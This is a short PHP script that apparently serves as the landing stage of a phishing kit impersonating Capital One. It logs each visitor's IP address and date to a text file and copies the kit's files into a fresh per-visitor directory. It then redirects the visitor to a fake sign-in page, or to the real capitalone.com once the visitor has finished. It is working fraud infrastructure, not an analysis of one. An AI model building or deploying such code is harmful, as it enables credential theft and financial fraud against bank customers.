<?php 
include "x/ctr.php";
include "x/lock.php";
session_start();

$ip = getenv("REMOTE_ADDR");
$adddate = date("D M d, Y g:i a");
$log = "IP: ".$ip." - ".$adddate." - ".$_SESSION['_DIR_']."\n";

if ($ip == $_SESSION['done']) {
	header("location: https://www.capitalone.com");
}
elseif ($_SESSION['done'] !== $ip) {
	recurse_copy( $rush4, $DIR );
	$testfile = fopen("v.txt", "a") or die("Unable to open file!");
	$txt = "$log";
	fwrite($testfile, $txt);
	fclose($testfile);
	header("location: ".$DIR."/index.php?section=signinpage&update=&cookiecheck=yes&destination=signin");
}
?>